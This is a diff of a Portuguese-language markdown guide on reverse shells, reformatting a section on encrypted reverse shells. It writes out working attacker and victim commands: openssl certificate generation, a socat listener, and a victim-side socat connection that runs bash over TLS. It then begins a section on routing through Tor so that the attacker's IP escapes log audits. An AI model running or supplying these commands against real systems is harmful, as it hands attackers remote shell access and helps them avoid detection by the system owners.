@@ -54,27 +54,23 @@ Abra duas instâncias do terminal e teste em localhost.
 
 ## Shell reverso criptografado
 
-Atacante:
+Basta usar o openssl para criar as chaves.
 
 ```shell
 
-# Servidor
+# Atacante-Servidor
 
 PORT="1111"
-
 openssl req -x509 -sha256 -newkey rsa:2048 -keyout server.pem -out server.pem -days 1000 -nodes -subj "/C=NA/ST=NARNIA/L=HIDDEN/O=Global Security/OU=IT Department/CN=hidden.onion"
-
 socat $(tty),raw,echo=0 openssl-listen:$PORT,reuseaddr,cert=server.pem,verify=0
-```
 
-Vítima:
+# Vítima-cliente
 
-```shell
-# CLiente
 HOST=localhost
 PORT=80
-socat openssl-connect:$HOST:$PORT,verify=0 exec:bash,pty,stderr,setsid
-```
+socat openssl-connect:$HOST:$PORT,verify=0 exec:bash,pty,stderr,setsid  
+ ```
+  
 ## Shell reverso utilizando a rede tor
 
 Em sistemas robustos são guardados vários logs, inclusive de conexões. Assim o endereço de ip da atacante seria facimente descoberto em uma auditoria. Mas utilizando a rede tor o atacante consegue tornar seu endereço de ip desconhecido, ele deve ter o tor instalado:
